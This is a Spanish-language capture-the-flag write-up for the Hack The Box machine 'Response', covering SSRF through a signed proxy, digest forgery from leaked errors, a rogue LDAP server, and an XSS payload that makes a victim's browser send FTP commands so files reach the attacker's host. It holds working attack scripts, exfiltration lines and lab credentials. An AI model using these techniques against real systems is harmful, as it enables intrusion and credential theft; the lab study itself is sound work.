---
layout: post
title: Response
date: 2023-02-05
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE]
---

<center><img src="/writeups/assets/img/Response-htb/Response_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclosure

* Cambio de tipo en la cookie para producir un error (Se leakea parte del salt)

* Creación de url_diggest y session_diggest abusando del error

* Abuso de HTTP-Proxy

* SSRF

* Scripting en Bash - Creación de Proxy Básico (Automatización de los pasos que seguía con BurpSuite)

* Scripting en Python - Creación de Internal Proxy con Flask

* Obtención de archivos internos

* LDAP Hijacking - Monto un servidor propio con Docker-Compose para autenticarme contra mi equipo

* XSS - Acceso al FTP vía cliente

* Análisis de código en Bash y Python

* Análisis de código en Lua (AVANZADO)

* Modificación de la configuración del LDAP (Con credenciales)

* Despliegue de servicio HTTPs en mi equipo

* DNS Hijacking

* Uso de IpTables para redirigir al servidor a mis DNS Records

* Subdomain Spoofing

* Uso de SMTP para conexión a mi equipo

* Interceptación de correo electrónico

* LFI

* User Pivoting

* Análisis de binario compilado de linux (MUY AVANZADO)

* Uso de Wireshark y tshark para analizar el tráfico de red en una captura

* Creación de Script para filtrar paquetes de un único puerto

* Obtención de Clave AES

* Scripting en Python (AVANZADO) - Creación de Script para descifrar el binario

* Reto Criptográfico (Creación de id_rsa a partir de la clave pública y una porción de la privada)


***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.163 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 08:30 GMT
Nmap scan report for 10.10.11.163
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.163 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 08:31 GMT
Nmap scan report for 10.10.11.163
Host is up (0.45s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9a4394afb065d5782fc4a0e0be46b25 (RSA)
|   256 a323e498dfb6911bf2ac2f1cc1469b15 (ECDSA)
|_  256 fb105fda55a66b953df2e85c0336ff31 (ED25519)
80/tcp open  http    nginx 1.21.6
|_http-title: Did not follow redirect to http://www.response.htb
|_http-server-header: nginx/1.21.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
```

Aplica un redirect a www.response.htb, así que añado el dominio y el subdominio al /etc/hosts

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.163
http://10.10.11.163 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.21.6], IP[10.10.11.163], RedirectLocation[http://www.response.htb], Title[302 Found], nginx[1.21.6]
http://www.response.htb [200 OK] Country[RESERVED][ZZ], Email[contact@response.htb], HTML5, HTTPServer[nginx/1.21.6], IP[10.10.11.163], Title[Response Scanning Solutions], nginx[1.21.6]
```

La página principal se ve de la siguiente forma:

<img src="/writeups/assets/img/Response-htb/1.png" alt="">

Como está muy estática, aplico fuzzing para encontrar rutas

```null
gobuster dir -u http://www.response.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.response.htb/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/05 08:37:45 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 169] [--> http://www.response.htb/img/]
/writeups/assets               (Status: 301) [Size: 169] [--> http://www.response.htb/writeups/assets/]
/css                  (Status: 301) [Size: 169] [--> http://www.response.htb/css/]
/status               (Status: 301) [Size: 169] [--> http://www.response.htb/status/]
/fonts                (Status: 301) [Size: 169] [--> http://www.response.htb/fonts/]
```

Enumero también los subdominios

```null
wfuzz -c --hh=145 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.response.htb" http://response.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://response.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000001:   200        109 L    297 W      4617 Ch     "www"                                                                                                                                           
000000051:   403        7 L      9 W        153 Ch      "api"                                                                                                                                           
000000070:   403        7 L      9 W        153 Ch      "chat"                                                                                                                                          
000000084:   200        1 L      1 W        21 Ch       "proxy"                                                                                                                                         

Total time: 7.543369
Processed Requests: 4989
Filtered Requests: 4985
Requests/sec.: 661.3755
```

Añado los tres nuevos al /etc/hosts


Abro la ruta /status que había visto antes

<img src="/writeups/assets/img/Response-htb/2.png" alt="">

En el código fuente se está haciendo una llama a un script en javascript con extensión PHP

<img src="/writeups/assets/img/Response-htb/3.png" alt="">

Dentro hay varias funciones (get_api_status, get_chat_status, get_servers, clear_servers, add_server, set_server_error)

Comienzo por la primera función. Me abro el BurpSuite para realizar las peticiones que se ven en el script

```js
function get_api_status(handle_data, handle_error) {
    url_proxy = 'http://proxy.response.htb/fetch';
    json_body = {'url':'http://api.response.htb/', 'url_digest':'cab532f75001ed2cc94ada92183d2160319a328e67001a9215956a5dbf10c545', 'method':'GET', 'session':'268fa1f78c9d3599ba0ddee66e85f79b', 'session_digest':'ecd35b35e3cb155297e692c152b93eb3c8264415ad942d804de916a67dbf3da9'};
    fetch(url_proxy, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(json_body)
    }).then(data => {
            return data.json();
    })
    .then(json => {
      if (json.status_code === 200) handle_data(JSON.parse(atob(json.body)));
      else handle_error('status_code ' + json.status_code);
    });
}
```

Al envíar, recibo una respuesta en base64, junto a un código de estado 200

<img src="/writeups/assets/img/Response-htb/4.png" alt="">

Le hago un decode para ver su contenido en texto claro

```null
echo; echo eyJhcGlfdmVyc2lvbiI6IjEuMCIsImVuZHBvaW50cyI6W3siZGVzYyI6ImdldCBhcGkgc3RhdHVzIiwibWV0aG9kIjoiR0VUIiwicm91dGUiOiIvIn0seyJkZXNjIjoiZ2V0IGludGVybmFsIGNoYXQgc3RhdHVzIiwibWV0aG9kIjoiR0VUIiwicm91dGUiOiIvZ2V0X2NoYXRfc3RhdHVzIn0seyJkZXNjIjoiZ2V0IG1vbml0b3JlZCBzZXJ2ZXJzIGxpc3QiLCJtZXRob2QiOiJHRVQiLCJyb3V0ZSI6Ii9nZXRfc2VydmVycyJ9XSwic3RhdHVzIjoicnVubmluZyJ9Cg== | base64 -d;

{"api_version":"1.0","endpoints":[{"desc":"get api status","method":"GET","route":"/"},{"desc":"get internal chat status","method":"GET","route":"/get_chat_status"},{"desc":"get monitored servers list","method":"GET","route":"/get_servers"}],"status":"running"}
```

Parece otra petición que puedo replicar con BurpSuite

Hago lo mismo con la segunda función

```js
function get_chat_status(handle_data, handle_error) {
    url_proxy = 'http://proxy.response.htb/fetch';
    json_body = {'url':'http://api.response.htb/get_chat_status', 'url_digest':'582cca8fd9e8eb387d8e462fb5bd73a8ae458c40801aa4754b9132c28039bd07', 'method':'GET', 'session':'268fa1f78c9d3599ba0ddee66e85f79b', 'session_digest':'ecd35b35e3cb155297e692c152b93eb3c8264415ad942d804de916a67dbf3da9'};
    fetch(url_proxy, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(json_body)
    }).then(data => {
            return data.json();
    })
    .then(json => {
      if (json.status_code === 200) handle_data(JSON.parse(atob(json.body)));
      else handle_error('status_code ' + json.status_code);
    });
}

```

Esta vez, la cadena es más corta

<img src="/writeups/assets/img/Response-htb/5.png" alt="">

Le hago el decode:

```null
echo; echo eyJzdGF0dXMiOiJydW5uaW5nIiwidmhvc3QiOiJjaGF0LnJlc3BvbnNlLmh0YiJ9Cg== | base64 -d;

{"status":"running","vhost":"chat.response.htb"}
```

Intercepto la petición que carga el script y me doy cuenta que estoy arrastrando un PHPSESSID y que coincide con la sesión de las funciones

<img src="/writeups/assets/img/Response-htb/6.png" alt="">

Abro todos los subdominios en diferentes pestañas del Firefox, para ver su respuesta

La única que devuelve algo de información es la del proxy

<img src="/writeups/assets/img/Response-htb/7.png" alt="">

Replico la respuesta que devolvió el servidor con la primera función

<img src="/writeups/assets/img/Response-htb/8.png" alt="">

Pero me falta el parámetro URL que desconozco

Al cambiar el tipo de dato de la cookie de sesión por un array, se puede ver un error donde se leakea parte del salt

<img src="/writeups/assets/img/Response-htb/9.png" alt="">

Si introduzco una URL en la cookie de sesión, aparece un error por ciertos caracteres, pero se leakea el session_digest

<img src="/writeups/assets/img/Response-htb/10.png" alt="">

Envío una petición a mi equipo, siguiendo la estructura de antes, pero cambiando la URL y el url_digest por la session_digest que se leakeaba antes

<img src="/writeups/assets/img/Response-htb/11.png" alt="">

Me quedo en escucha con netcat y recibo una petición

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.163.
Ncat: Connection from 10.10.11.163:34124.
GET /test HTTP/1.1
Host: 10.10.16.3
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
PHPSESSID: 268fa1f78c9d3599ba0ddee66e85f79b
```

Como estoy ante un proxy, podría tratar de realizar peticiones no a mí, si no a recursos a los que yo de primeras no estoy autorizado abusando de un SSRF

<img src="/writeups/assets/img/Response-htb/12.png" alt="">

Para ver su contenido en un buen formato, ya que al hacer el decode no hay retornos de carro ni saltos de línea, utilizo un beautifer online para transformarlo

<img src="/writeups/assets/img/Response-htb/13.png" alt="">

Se está incluyendo un comprimido

```null
<a href="files/chat_source.zip" style="text-decoration:none;color:#cccccc;">download source code</a>
```

Como es mucho contenido, tramito una petición por curl y lo deposito en un archivo

```null
curl -s -X POST -H "Content-Type: Application/json" -d '{"url":"http://chat.response.htb/files/chat_source.zip", "url_digest":"c28fa1cd83806a968d71e60198ddcc50c37111c0e03a71fd883ab3ae5f399c11", "method":"GET", "session":"268fa1f78c9d3599ba0ddee66e85f79b", "session_digest":"ecd35b35e3cb155297e692c152b93eb3c8264415ad942d804de916a67dbf3da9"}' http://proxy.response.htb/fetch -o data
```

Me quedo con el campo body y lo deposito en otro archivo decodeado

```null
cat data | jq -r .body | base64 -d > file.zip

file file.zip
file.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Lo descomprimo para analizar sus archivos

```null
unzip file.zip -d file
```

Dentro hay un READ con las instrucciones de insatlación

```null
mdcat README.md
┄Response Scanning Solutions - Internal Chat Application

This repository contains the Response Scanning Solutions internal chat application.

The application is based on the following article: https://socket.io/get-started/private-messaging-part-1/.

┄┄How to deploy

Make sure redis server is running and configured in server/index.js.

Adjust socket.io URL in src/socket.js.

Install and build the frontend:

────────────────────
$ npm install
$ npm run build
────────────────────

Install and run the server:

────────────────────
$ cd server
$ npm install
$ npm start
────────────────────
```

Se pueden ver credenciales en un archivo

```null
find . | xargs grep -ri "pass"
./server/index.js:async function authenticate_user(username, password, authserver) {
./server/index.js:  if (username === 'guest' && password === 'guest') return true;
```

Se está produciendo una autenticación contra LDAP

```js
const { authenticate } = require("ldap-authentication");


async function authenticate_user(username, password, authserver) {

  if (username === 'guest' && password === 'guest') return true;

  if (!/^[a-zA-Z0-9]+$/.test(username)) return false;
  
  let options = {
    ldapOpts: { url: `ldap://${authserver}` },
    userDn: `uid=${username},ou=users,dc=response,dc=htb`,
    userPassword: password,
  }
  try {
    return await authenticate(options);
  } catch { }
  return false;

}

io.use(async (socket, next) => {
  const sessionID = socket.handshake.auth.sessionID;
  if (sessionID) {
    const session = await sessionStore.findSession(sessionID);
    if (session) {
      socket.sessionID = sessionID;
      socket.username = session.username;
      return next();
    }
  }
```

Creo un script que automatiza la descarga de archivos

```bash
#!/bin/bash

url="$1"

session_digest=$(curl -s -X GET http://www.response.htb/status/main.js.php -H "Cookie: PHPSESSID=$url" | grep "session_digest" | tail -n 1 | grep -oP "{.*?}" | tr '{,}' '\n' | tail -n 2 | head -n 1 | grep -oP "'.*?'" | tr -d "'" | tail -n 1)

echo -e "\n[+] Session_diggest: $session_digest"

post_data=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"url\":\"$url\", \"url_digest\":\"$session_digest\", \"method\":\"GET\", \"session\":\"268fa1f78c9d3599ba0ddee66e85f79b\", \"session_digest\":\"ecd35b35e3cb155297e692c152b93eb3c8264415ad942d804de916a67dbf3da9\"}" http://proxy.response.htb/fetch | jq -r .body | base64 -d)

echo -e "\n[+] Contenido:\n\n$(echo $post_data | tidy | tee index.html)" # En caso de que tidy de error, eliminar
```

Me descargo los recursos, y en local puedo ver que hay un panel de inicio de sesión

<img src="/writeups/assets/img/Response-htb/14.png" alt="">

Las credenciales las vi antes (guest:guest)

Intercepto la petición con BurpSuite, y como no va a resolver paso por el proxy con el script que he creado

```null
/proxy.sh "http://chat.response.htb/socket.io/?EIO=4&transport=polling&t=OOXN9Xp"
0{"sid":"dder65BFMTp3CkEXAAAA","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000}
```

Si le añado el SID como parámetro, me devulve un 2

```null
./proxy.sh "http://chat.response.htb/socket.io/?EIO=4&transport=polling&t=OOXN9Xp&sid=FnsCqWYaTidFYKt6AAAA"
2
```

Como mi script no es lo suficientemente potente como para ver y enviar solicitudes en tiempo real, busco la forma de crear un script en python que cree un proxy a través de Flask. Encuentro este [artículo](https://realpython.com/python-web-applications/)

Quedaría de la siguiente forma. Es importante recalcar que para que las peticiones se tramiten correctamente, chat.response.htb debe apuntar al localhost, en caso contrario no se está pasando por el proxy las peticiones por POST y no se puede iniciar sesión.

```python
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import random
import re
import requests
from socketserver import ThreadingMixIn
import sys
import threading
import time


hostName = "0.0.0.0"
serverPort = 80


class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.request_handler('GET')

    def do_POST(self):
        self.request_handler('POST')

    def request_handler(self, method):
        self.random_number = random.randint(100000,999999)

        path = self.path
        myurl = 'http://chat.response.htb' + path
        print(f"[{self.random_number}] {method} {myurl}")
       
        if method == 'POST':
            content_len = int(self.headers.get('Content-Length'))
            post_body = self.rfile.read(content_len)
            print(f"[{self.random_number}] body: {post_body}")
        else:
            post_body = None

        digest = self.get_digest(myurl)

        data = self.send_request_to_proxy(myurl, method, digest, post_body)

        self.send_response(200)
        if path.endswith('.js'):
            self.send_header("Content-type", "application/javascript")
        elif path.endswith('.css'):
            self.send_header("Content-type", "text/css")
        else:
            self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(data)

    def get_digest(self, myurl):
        url = 'http://www.response.htb/status/main.js.php'
        cookies = {'PHPSESSID': myurl}
        response = requests.get(url, cookies=cookies)
        response.raise_for_status()
        assert 'session_digest' in response.text
        session_digest = re.search(r'\'session_digest\':\'([^\']+)', response.text).group(1)
        return session_digest

    def send_request_to_proxy(self, myurl, method, digest, body=None):
        url = 'http://proxy.response.htb/fetch'
        data = {'url': myurl,
                'url_digest': digest,
                'method': method,
                'session': '1a5455b829845168770cb337f1a05507',
                'session_digest': 'd27e297b494df599e72985e6e9a166751d7de74136df9d74468aac0818c29125'}
        if method == 'POST':
            data['body'] = base64.b64encode(body)
        response = requests.post(url, json=data)
        response.raise_for_status()
        assert 'body' in response.text and 'status_code' in response.text
        body = response.json()['body']
        status_code = response.json()['status_code']
        print(f"[{self.random_number}] status_code from proxy: {status_code}; length of body: {len(body)}")
        decoded_string = base64.b64decode(body)
        return decoded_string


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def main():
    webServer = ThreadedHTTPServer((hostName, serverPort), MyServer)

    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")


if __name__ == "__main__":       
    main()
```

Ahora tengo acceso completo al chat

<img src="/writeups/assets/img/Response-htb/15.png" alt="">

Envío datos en el chat de Bob y recibo respuestas

<img src="/writeups/assets/img/Response-htb/16.png" alt="">

Pero creo que es un rabbit hole y no me lleva a ningún sitio

Intercepto la petición de inicio de sesión con BurpSuite y veo como se tramitan los datos. Hay que borrar el SessionID del almacenamiento para poder cerrar la sesión

<img src="/writeups/assets/img/Response-htb/17.png" alt="">

Al introducir credenciales erróneas, la respuesta es la misma, por lo que no puedo efectuar ataques de fuerza bruta ni inyecciones de ningún tipo. Sin embargo, puedo intentar cambiar el servidor LDAP por uno que creo de mi lado

Hago una búsqueda en Google y encuentro varias formas de montarlo con un contenedor en Docker

<img src="/writeups/assets/img/Response-htb/18.png" alt="">

Tengo que crear un archivo de configuración como el del ejemplo, adaptándolo para mi caso

<img src="/writeups/assets/img/Response-htb/19.png" alt="">

Hay que especificarle una contraseña para que más adelante no lo detecte como inseguro

```null
version: '2'
services:
  ldap:
    image: osixia/openldap:1.5.0
    container_name: ldap
    environment:
        - LDAP_ORGANISATION=response
        - LDAP_DOMAIN=response.htb
        - "LDAP_BASE_DN=dc=response,dc=htb"
        - LDAP_ADMIN_PASSWORD=rubbx123
    ports:
        - 389:389
        - 636:636
```

El siguiente paso es levantar el servicio

<img src="/writeups/assets/img/Response-htb/20.png" alt="">

Todo lo gestiona docker-compose

```null
docker-compose up -d ldap
Creating network "docker-ldap_default" with the default driver
Creating ldap ... done
```

Faltan los archivos de configuración de los usuarios

El users.ldif

```null
dn: ou=users,dc=response,dc=htb
objectClass: top
objectClass: organizationalUnit
ou: users
```

Y el admin.ldif

```null
dn: uid=admin,ou=users,dc=response,dc=htb
uid: admin
cn: admin
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/admin
uidNumber: 14583102
gidNumber: 14564100
mail: admin@response.htb
gecos: admin
```

Copio ambos ficheros al contendedor y me meto dentro

```null
docker cp users.ldif ldap:/
docker cp admin.ldif ldap:/

docker exec -it ldap bash
root@59dc459c4c87:/# 
```

Agrego los namingcontexts que había definido antes

```null
root@59dc459c4c87:/# ldapadd -x -H ldap://localhost -D "cn=admin,dc=response,dc=htb" -w rubbx123 -f users.ldif
adding new entry "ou=users,dc=response,dc=htb"
```

Y también para el administrador

```null
root@59dc459c4c87:/# ldapadd -x -H ldap://localhost -D "cn=admin,dc=response,dc=htb" -w rubbx123 -f admin.ldif 
adding new entry "uid=admin,ou=users,dc=response,dc=htb"
```

Ahora le puedo cambiar la contraseña al usuario Admin de mi LDAP y como la autenticación se va a producir a mi lado, me podré autenticar como Admin en el servicio web

```null
root@59dc459c4c87:/# ldappasswd -D "cn=admin,dc=response,dc=htb" -w rubbx123 -s "rubbx123" -x "uid=admin,ou=users,dc=response,dc=htb"
```

<img src="/writeups/assets/img/Response-htb/21.png" alt="">

En Wireshark, puedo ver como se ha tramitado la autenticación

<img src="/writeups/assets/img/Response-htb/26.png" alt="">

Y aparezco loggeado como ese usuario

<img src="/writeups/assets/img/Response-htb/22.png" alt="">

Dentro del chat de Bob dan una pista (CTF Like), con el usuario y la contraseña del FTP

<img src="/writeups/assets/img/Response-htb/23.png" alt="">

Espera que se le pase un link, así que a modo de traza, le comparto un recurso de alojado de mi lado

<img src="/writeups/assets/img/Response-htb/24.png" alt="">

Y recibo la petición

```null
python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.11.163 - - [05/Feb/2023 16:23:24] code 404, message File not found
10.10.11.163 - - [05/Feb/2023 16:23:24] "GET /test HTTP/1.1" 404 -
10.10.11.163 - - [05/Feb/2023 16:23:25] code 404, message File not found
10.10.11.163 - - [05/Feb/2023 16:23:25] "GET /favicon.ico HTTP/1.1" 404 -
```

Me pongo ahora en escucha pero con netcat, para fijarme en el User-Agent

```null
nc -nlvp 81
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::81
Ncat: Listening on 0.0.0.0:81
Ncat: Connection from 10.10.11.163.
Ncat: Connection from 10.10.11.163:42264.
GET /test HTTP/1.1
Host: 10.10.16.3:81
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

Intento acceder al puerto 21 abusando del SSRF de antes pero no tengo acceso

<img src="/writeups/assets/img/Response-htb/25.png" alt="">

Puedo intentar efectuar un XSS, y que el propio usuario sea quien me proporcione los datos al abrir un enlace, pero aunque reciba la petición al servidor de python, no recibo nada por netcat

```null
python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.11.163 - - [06/Feb/2023 09:06:29] "GET / HTTP/1.1" 200 -
10.10.11.163 - - [06/Feb/2023 09:06:30] "GET /pwned.js HTTP/1.1" 200 -
```

Para solucionarlo, hago que la petición a mi equipo se tramite desde el propio FTP. Hay que tener en cuenta que la IP va separada por comas y no puntos y el puerto tiene que estar en formato bytes. Para que esto sea posible, el puerto tiene que tene un valor muy alto, porque si no, la parte entera siempre va a valer 0, ya que se obtiene de la división del puerto entre 256 más las unidades que falten para el total. En FTP, corresponde al error `500 Illegal PORT command`

<img src="/writeups/assets/img/Response-htb/27.png" alt="">

Mi JavaScript quedaría de la siguiente forma:

```
var peticion = new XMLHttpRequest();
peticion.open("POST", "http://172.18.0.6:2121", true);
peticion.send("USER ftp_user\r\nPASS Secret12345\r\nPORT 10,10,16,3,156,64\r\nLIST\r\n");
```

Intenté enviarle directamente el script, pero así no lo interpreta. Hay que crear un index.html

```null
<html>
<script src="http://10.10.16.3:81/pwned.js"></script>
</html>
```

Le envío el enlace y recibo el contenido

```null
nc -nlvp 40000
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::40000
Ncat: Listening on 0.0.0.0:40000
Ncat: Connection from 10.10.11.163.
Ncat: Connection from 10.10.11.163:39816.
-rw-r--r--    1 root     root            74 Mar 16  2022 creds.txt
```

Cambio el LIST por un RETR creds.txt para ver el contenido

```null
nc -nlvp 40000
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::40000
Ncat: Listening on 0.0.0.0:40000
Ncat: Connection from 10.10.11.163.
Ncat: Connection from 10.10.11.163:40544.
ftp
---
ftp_user / Secret12345

ssh
---
bob / F6uXVwEjdZ46fsbXDmQK7YPY3OM
```

Y obtengo credenciales de acceso por SSH

```null
ssh bob@response.htb
bob@response.htb's password: 

bob@response:~$ whoami
bob
bob@response:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@response:~$ hostname -I
10.10.11.163 172.17.0.1 172.18.0.1 172.19.0.1 dead:beef::250:56ff:feb9:20a8 
```

Puedo visualizar la primera flag

```null
bob@response:~$ cat user.txt 
2b0b86b0ae79e3d2733c6dbed29a8595
```

# Escalada

Es extraño, el directorio típico donde se almacenan las páginas web no existe

```null
bob@response:~$ cd /var/www/html
-bash: cd: /var/www/html: No such file or directory
```

Pero hay varios contenedores corriendo con Docker por el usuario root

```null
bob@response:~$ ps -faux | grep docker
bob         6077  0.0  0.0   6432   720 pts/0    S+   10:21   0:00              \_ grep --color=auto docker
root        1137  0.1  2.0 1997124 83716 ?       Ssl  09:42   0:03 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1683  0.0  0.0 1148872 3572 ?        Sl   09:42   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 389 -container-ip 172.18.0.7 -container-port 389
root        2309  0.0  0.0 1148872 3876 ?        Sl   09:42   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.18.0.9 -container-port 80
root        2314  0.0  0.0 1222604 3668 ?        Sl   09:42   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.18.0.9 -container-port 80
```

Hay otro usuario a parte del que ya tengo, por lo que puedo intentar migrar a él

```null
bob@response:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
scryh:x:1000:1000:scryh:/home/scryh:/bin/bash
bob:x:1001:1001::/home/bob:/bin/bash
```

Tengo acceso a un directorio suyo

```null
bob@response:/home/scryh/scan$ ls
data  output  scan.sh  scripts  send_report.py
```

Dejo de fondo el PsPy ejecutándose para ver tareas que se ejecutan en intervalos regulares de tiempo

```null
2023/02/06 10:27:01 CMD: UID=1000 PID=6532   | bash -c cd /home/scryh/scan;./scan.sh 
2023/02/06 10:27:01 CMD: UID=1000 PID=6533   | /bin/bash ./scan.sh 
2023/02/06 10:27:01 CMD: UID=1000 PID=6540   | cut -d   -f2 
2023/02/06 10:27:01 CMD: UID=1000 PID=6539   | grep ipHostNumber 
2023/02/06 10:27:01 CMD: UID=1000 PID=6538   | /bin/bash ./scan.sh 
2023/02/06 10:27:01 CMD: UID=1000 PID=6537   | /bin/bash ./scan.sh 
2023/02/06 10:27:01 CMD: UID=1000 PID=6541   | nmap -v -Pn 172.18.0.4 -p 443 --script scripts/ssl-enum-ciphers,scripts/ssl-cert,scripts/ssl-heartbleed -oX output/scan_172.18.0.4.xml 
2023/02/06 10:27:01 CMD: UID=0    PID=6542   | 
2023/02/06 10:27:11 CMD: UID=1000 PID=6543   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6551   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6550   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6549   | grep manager: uid= 
2023/02/06 10:27:11 CMD: UID=1000 PID=6548   | /usr/bin/ldapsearch -x -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -s sub -b ou=servers,dc=response,dc=htb (&(objectclass=ipHost)(ipHostNumber=172.18.0.4)) 
2023/02/06 10:27:11 CMD: UID=1000 PID=6547   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6552   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6555   | cut -d   -f2 
2023/02/06 10:27:11 CMD: UID=1000 PID=6554   | grep mail:  
2023/02/06 10:27:11 CMD: UID=1000 PID=6553   | /usr/bin/ldapsearch -x -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -s sub -b ou=customers,dc=response,dc=htb (uid=marie) 
2023/02/06 10:27:11 CMD: UID=1000 PID=6556   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6563   | sort 
2023/02/06 10:27:11 CMD: UID=1000 PID=6562   | cut -d = -f2 
2023/02/06 10:27:11 CMD: UID=1000 PID=6561   | grep mail exchanger 
2023/02/06 10:27:11 CMD: UID=1000 PID=6560   | nslookup -type=mx response-test.htb 
2023/02/06 10:27:11 CMD: UID=1000 PID=6559   | /bin/bash ./scan.sh 
2023/02/06 10:27:11 CMD: UID=1000 PID=6565   | cut -d   -f3 
2023/02/06 10:27:11 CMD: UID=1000 PID=6564   | head -n1 
2023/02/06 10:27:16 CMD: UID=1000 PID=6575   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6574   | head -n1 
2023/02/06 10:27:16 CMD: UID=1000 PID=6573   | sort 
2023/02/06 10:27:16 CMD: UID=1000 PID=6572   | cut -d = -f2 
2023/02/06 10:27:16 CMD: UID=1000 PID=6571   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6570   | timeout 0.5 nslookup -type=mx response-test.htb 172.18.0.4 
2023/02/06 10:27:16 CMD: UID=1000 PID=6569   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6576   | timeout 0.5 nslookup -type=mx response-test.htb 172.18.0.4 
2023/02/06 10:27:16 CMD: UID=1000 PID=6580   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6585   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6584   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6583   | /bin/bash ./scan.sh 
2023/02/06 10:27:16 CMD: UID=1000 PID=6582   | grep Name: -A2 
2023/02/06 10:27:16 CMD: UID=1000 PID=6581   | nslookup mail.response-test.htb. 172.18.0.4 
2023/02/06 10:27:16 CMD: UID=1000 PID=6589   | python3 ./send_report.py 172.18.0.4 marie.w@response-test.htb output/scan_172.18.0.4.pdf 
2023/02/06 10:27:16 CMD: UID=0    PID=6590   | /bin/bash /root/ldap/scan.sh 
2023/02/06 10:27:16 CMD: UID=0    PID=6591   | cp /root/ldap/data.mdb /root/docker/openldap/data/slapd/database/ 
